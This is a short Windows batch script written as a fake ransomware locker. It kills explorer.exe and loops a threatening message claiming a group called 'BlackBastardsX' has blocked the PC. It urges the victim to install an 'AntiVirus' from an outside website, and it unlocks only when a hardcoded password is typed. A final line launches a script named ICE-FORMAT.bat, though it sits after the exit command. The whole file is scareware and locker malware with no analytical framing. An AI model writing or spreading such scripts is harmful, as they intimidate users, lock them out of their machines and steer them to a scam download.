color 0A
@echo off 
title !!!???
taskkill /f /im explorer.exe 
:bucle 
cls    
echo  -Oops! your files being BLOCKED
echo  -What happened? BlackBastardsX Infected your device and now we blocked your pc
echo  -What can i do? Nothing
echo  -dont close this window, you will regret
echo  -install our AntiVirus to avoid more situations like this:https://antiviruson-cmd.jimdosite.com/
echo  -unlucky day.
set /p pass= Escriba aqui el password: 
if %pass%==afraid (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades! El password es correcto.
start explorer.exe
pause
exit
start C:\ICE-FORMAT.bat